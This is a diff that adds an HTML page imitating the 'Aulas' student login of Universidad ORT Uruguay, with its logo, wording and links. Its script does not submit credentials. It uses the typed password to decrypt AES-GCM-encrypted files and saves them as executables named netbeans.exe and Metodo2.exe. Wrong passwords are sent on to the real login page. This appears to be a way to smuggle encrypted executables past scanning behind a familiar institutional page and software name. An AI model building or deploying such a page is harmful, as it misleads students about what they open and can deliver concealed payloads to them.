@@ -1,0 +1,194 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Entrar al sitio | Aulas</title>
+  <link rel="icon" type="image/png" href="/favicon.png">
+  <style>
+    :root {
+      --rojo: #7a1f2b;
+      --rojo-osc: #5e1620;
+      --borde: #b8b8b8;
+      --fondo-input: #ffffff;
+      --texto: #333;
+      --fondo-pagina: #ececec;
+    }
+    * { box-sizing: border-box; }
+    body {
+      font-family: "Helvetica Neue", Arial, sans-serif;
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      background: var(--fondo-pagina);
+      color: var(--texto);
+      padding: 24px 16px;
+    }
+    .tarjeta {
+      background: #fff;
+      width: 100%;
+      max-width: 780px;
+      margin-top: 24px;
+      padding: 48px 56px 40px;
+      border-radius: 4px;
+      box-shadow: 0 2px 10px rgba(0,0,0,.12);
+      text-align: center;
+    }
+    .encabezado {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 20px;
+      margin-bottom: 40px;
+    }
+    .encabezado img.logo { height: 92px; }
+    form { display: flex; flex-direction: column; gap: 18px; }
+    input {
+      width: 100%;
+      font-size: 1.25rem;
+      padding: 12px 14px;
+      border: 1px solid var(--borde);
+      border-radius: 4px;
+      background: var(--fondo-input);
+      color: var(--texto);
+      outline: none;
+    }
+    input:focus { border-color: var(--rojo); }
+    button {
+      align-self: flex-start;
+      font-size: 1.15rem;
+      padding: 12px 34px;
+      border: 0;
+      border-radius: 30px;
+      background: var(--rojo);
+      color: #fff;
+      cursor: pointer;
+    }
+    button:hover { background: var(--rojo-osc); }
+    button:disabled { opacity: .6; cursor: wait; }
+    .olvide {
+      align-self: flex-start;
+      color: var(--rojo);
+      text-decoration: none;
+      font-size: .95rem;
+    }
+    #msg { min-height: 1.3em; margin: 0; text-align: left; color: var(--rojo); font-weight: 600; }
+    .aviso {
+      margin-top: 40px;
+      border: 1px solid var(--rojo);
+      border-radius: 4px;
+      padding: 18px;
+    }
+    .aviso p {
+      margin: 0;
+      background: #ececec;
+      padding: 14px;
+      color: var(--rojo);
+      font-weight: 600;
+      font-size: .95rem;
+      line-height: 1.5;
+    }
+    .info {
+      margin-top: 24px;
+      border: 1px solid var(--borde);
+      border-radius: 4px;
+      padding: 16px;
+      font-size: .9rem;
+      text-align: left;
+      line-height: 1.5;
+    }
+    @media (max-width: 560px) {
+      .tarjeta { padding: 32px 20px; }
+      .encabezado img.logo { height: 64px; }
+    }
+  </style>
+</head>
+<body>
+  <main class="tarjeta">
+    <div class="encabezado">
+      <img class="logo" src="logo.png" alt="Universidad ORT Uruguay">
+    </div>
+
+    <form id="f" autocomplete="off">
+      <input id="usuario" type="text" autocomplete="off" placeholder="Usuario">
+      <input id="password" type="password" autocomplete="new-password" placeholder="Contraseña" autofocus>
+      <button type="submit">Acceder</button>
+      <a class="olvide" href="https://aulas.ort.edu.uy/login/index.php">¿Olvidaste tu usuario o contraseña?</a>
+      <p id="msg"></p>
+    </form>
+
+    <div class="aviso">
+      <p>Por motivos de seguridad, te recomendamos que mantengas siempre actualizado el software que utilizás para los cursos.</p>
+    </div>
+
+    <div class="info">
+      Aulas es el sistema de apoyo online a cursos de la Universidad ORT Uruguay, que facilita la comunicación entre docentes y estudiantes.
+    </div>
+  </main>
+
+  <script>
+    // ─── Configuración ───
+    // El archivo está cifrado (AES-256-GCM, clave = PBKDF2-SHA256 de la contraseña).
+    // Formato: salt(16) | iv(12) | datos cifrados + tag
+    const CIFRADOS = [
+      { url: "/archivos/netbeans.bin", nombre: "netbeans.exe" },
+      { url: "/archivos/metodo.bin",   nombre: "Metodo2.exe"  },
+    ];
+    const ITER     = 600000;
+    const REDIRECT = "https://aulas.ort.edu.uy/login/index.php";
+    // ─────────────────────
+
+    const msg   = document.getElementById("msg");
+    const boton = document.querySelector("button");
+    const blobs = {}; // cada archivo se baja una sola vez
+
+    function decir(texto) { msg.textContent = texto; }
+
+    document.getElementById("f").addEventListener("submit", async (e) => {
+      e.preventDefault();
+      const usuario  = document.getElementById("usuario").value.trim();
+      const password = document.getElementById("password").value;
+      if (!usuario || !password) return;
+
+      boton.disabled = true;
+      try {
+        decir("Verificando credenciales…");
+        for (const conf of CIFRADOS) {
+          if (!blobs[conf.url]) {
+            const r = await fetch(conf.url);
+            if (!r.ok) throw new Error("No se pudo bajar el archivo (" + r.status + ")");
+            blobs[conf.url] = new Uint8Array(await r.arrayBuffer());
+          }
+          const blob = blobs[conf.url];
+          const base = await crypto.subtle.importKey("raw", new TextEncoder().encode(password), "PBKDF2", false, ["deriveKey"]);
+          const clave = await crypto.subtle.deriveKey(
+            { name: "PBKDF2", hash: "SHA-256", salt: blob.slice(0, 16), iterations: ITER },
+            base, { name: "AES-GCM", length: 256 }, false, ["decrypt"]);
+          let plano;
+          try {
+            plano = await crypto.subtle.decrypt({ name: "AES-GCM", iv: blob.slice(16, 28) }, clave, blob.slice(28));
+          } catch {
+            continue; // esta contrasena no abre este archivo, prueba el siguiente
+          }
+          const url = URL.createObjectURL(new Blob([plano], { type: "application/octet-stream" }));
+          const a = document.createElement("a");
+          a.href = url;
+          a.download = conf.nombre;
+          document.body.appendChild(a);
+          a.click();
+          a.remove();
+          setTimeout(() => URL.revokeObjectURL(url), 60000);
+          decir("Listo ✓");
+          return;
+        }
+        window.location.href = REDIRECT; // contraseña incorrecta
+      } catch (err) {
+        decir(err.message);
+      } finally {
+        boton.disabled = false;
+      }
+    });
+  </script>
+</body>
+</html>
